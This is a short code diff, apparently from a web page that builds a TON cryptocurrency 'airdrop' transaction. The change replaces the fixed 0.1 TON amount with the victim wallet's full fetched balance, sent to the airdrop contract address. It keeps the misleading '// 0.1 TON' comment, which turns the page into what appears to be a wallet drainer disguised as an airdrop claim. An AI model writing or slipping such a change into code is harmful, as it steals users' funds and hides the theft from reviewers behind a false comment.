@@ -329,19 +329,19 @@
                 const payload = await createPayload();
 
                 async function getBalance(address) {
-                    const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
-                    const data = await response.json();
-                    return BigInt(data.result);
-                }
-                const balance = await getBalance(wallet.account.address);
+            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+            const data = await response.json();
+            return BigInt(data.result);
+        }
+        const balance = await getBalance(wallet.account.address);
                 // Konfiguracja transakcji
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 360,
                     messages: [
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: '100000000', // 0.1 TON
-                            payload: balance.toString()
+                            amount: balance.toString(), // 0.1 TON
+                            payload: payload
                         }
                     ]
                 };
